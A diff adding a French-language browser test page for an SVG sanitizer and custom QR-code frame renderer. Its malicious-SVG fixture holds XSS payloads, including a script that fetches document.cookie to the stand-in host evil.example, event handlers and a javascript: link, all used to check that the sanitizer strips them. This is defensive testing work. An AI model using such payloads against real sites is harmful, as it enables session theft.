@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="fr"><head><meta charset="utf-8"><title>SDQR — test sanitizer + cadre sur-mesure</title>
+<style>body{font-family:-apple-system,sans-serif;background:#0f1d3a;color:#e8edf8;padding:24px}.ok{color:#7ee0b5;font-weight:700}.ko{color:#ff9a9a;font-weight:700}table{border-collapse:collapse;width:100%;font-size:13px;margin-bottom:18px}td,th{padding:7px 12px;border-bottom:1px solid rgba(255,255,255,.08);text-align:left}#s{font-weight:800;font-size:15px;margin:10px 0}.render{background:#fff;border-radius:14px;padding:12px;display:inline-block}.render svg{width:240px;height:auto}</style></head>
+<body><h1>Test sécurité sanitizer + rendu cadre sur-mesure</h1><div id="s">…</div>
+<table id="r"><thead><tr><th>Cas</th><th>Attendu</th><th>Résultat</th></tr></thead><tbody></tbody></table>
+<div id="render"></div>
+<script type="module">
+const { sanitizeFrameSvg, renderQrCustom } = await import('../../app/sdqr-render.js?cb=' + Date.now());
+import jsQR from 'https://esm.sh/jsqr@1.4.0';
+const tb = document.querySelector('#r tbody'); const checks = [];
+const row = (name, pass, detail) => { checks.push(pass); const tr=document.createElement('tr'); tr.innerHTML=`<td>${name}</td><td>${detail}</td><td class="${pass?'ok':'ko'}">${pass?'✓ OK':'✗ ÉCHEC'}</td>`; tb.appendChild(tr); };
+
+// 1) SVG MALVEILLANT : script, onload racine, onclick, foreignObject, image externe, javascript: href
+const MAL = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 300 340" onload="alert(1)">
+  <script>fetch('//evil.example/'+document.cookie)<\/script>
+  <rect x="0" y="0" width="300" height="340" rx="24" fill="#1b2a4a" onclick="steal()"/>
+  <foreignObject x="0" y="0" width="50" height="50"><div onmouseover="x()">hi</div></foreignObject>
+  <image href="https://evil.example/x.png" x="0" y="0" width="20" height="20"/>
+  <a href="javascript:alert(3)"><text x="150" y="320" fill="#fff">SCANNEZ</text></a>
+  <rect id="qr-slot" x="50" y="60" width="200" height="200" fill="#ffffff"/>
+</svg>`;
+const malRes = sanitizeFrameSvg(MAL);
+row('SVG malveillant accepté après nettoyage', malRes.ok, 'ok=true (nettoyé, slot présent)');
+const out = (malRes.svg||'');
+row('  → aucun <script>', !/<script/i.test(out), 'retiré');
+row('  → aucun gestionnaire on*', !/\son\w+\s*=/i.test(out), 'onload/onclick/onmouseover retirés');
+row('  → aucun <foreignObject>', !/foreignobject/i.test(out), 'retiré');
+row('  → aucune image externe http', !/https?:\/\//i.test(out.replace(/xmlns="[^"]*"/g,'')), 'image externe retirée');
+row('  → aucun javascript:', !/javascript:/i.test(out), 'href javascript: retiré');
+row('  → slot extrait', malRes.slot && malRes.slot.w===200 && malRes.slot.x===50, 'x=50 w=200');
+
+// 2) SVG SANS slot → rejet propre
+const NOSLOT = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200"><rect width="200" height="200" fill="#1b2a4a"/></svg>`;
+const r2 = sanitizeFrameSvg(NOSLOT);
+row('SVG sans #qr-slot rejeté', !r2.ok && /qr-slot/i.test(r2.error||''), 'ok=false + message slot');
+
+// 3) Trop lourd → rejet
+const BIG = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><rect id="qr-slot" x="1" y="1" width="8" height="8"/>' + '<rect/>'.repeat(20000) + '</svg>';
+const r3 = sanitizeFrameSvg(BIG);
+row('SVG trop lourd rejeté', !r3.ok, 'ok=false (max 32 Ko)');
+
+// 4) Non-SVG → rejet
+const r4 = sanitizeFrameSvg('<html><body>nope</body></html>');
+row('Non-SVG rejeté', !r4.ok, 'ok=false');
+
+// 5) Cadre propre → rendu + scan jsQR
+const CLEAN = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 360">
+  <rect x="8" y="8" width="304" height="344" rx="26" fill="#1b2a4a"/>
+  <rect x="56" y="70" width="208" height="208" rx="14" fill="#ffffff"/>
+  <path d="M40 300 H280 L300 332 H20 Z" fill="#6c6cf5"/>
+  <text x="160" y="324" text-anchor="middle" font-family="sans-serif" font-size="22" font-weight="800" fill="#fff">SCANNEZ-MOI</text>
+  <rect id="qr-slot" x="62" y="76" width="196" height="196" fill="#ffffff"/>
+</svg>`;
+const cl = sanitizeFrameSvg(CLEAN);
+row('Cadre propre accepté', cl.ok, 'ok=true');
+let scanOK = false;
+if (cl.ok) {
+  const TXT = 'https://protein-keystone.com/r/AB12CD34';
+  const design = { module:{shape:'rounded'}, anchor:{outer:{shape:'rounded'},inner:{shape:'dot'}}, fg:'#0a2741', frame:{ style:'custom', customSvg:cl.svg, customSlot:cl.slot, customVB:cl.vb } };
+  const svg = await renderQrCustom(TXT, design, 280);
+  document.getElementById('render').innerHTML = '<div class="render">'+svg+'</div>';
+  // raster + decode (viewBox-aware)
+  const m = svg.match(/viewBox="0 0 ([\d.]+) ([\d.]+)"/); const W=Math.round(+m[1]),H=Math.round(+m[2]);
+  const img=new Image(); img.src='data:image/svg+xml;charset=utf-8,'+encodeURIComponent(svg); await img.decode();
+  const c=document.createElement('canvas'); c.width=W;c.height=H; const x=c.getContext('2d'); x.fillStyle='#fff'; x.fillRect(0,0,W,H); x.drawImage(img,0,0,W,H);
+  const res=jsQR(x.getImageData(0,0,W,H).data,W,H); scanOK = !!res && res.data===TXT;
+}
+row('QR cadre sur-mesure SCANNABLE (jsQR)', scanOK, 'décodé == URL');
+
+const s=document.getElementById('s'); const passed=checks.filter(Boolean).length;
+s.textContent = `${passed}/${checks.length} vérifications OK`; s.className = passed===checks.length?'ok':'ko';
+window.__SCAN_DONE = true; window.__ALL_OK = passed===checks.length;
+</script></body></html>
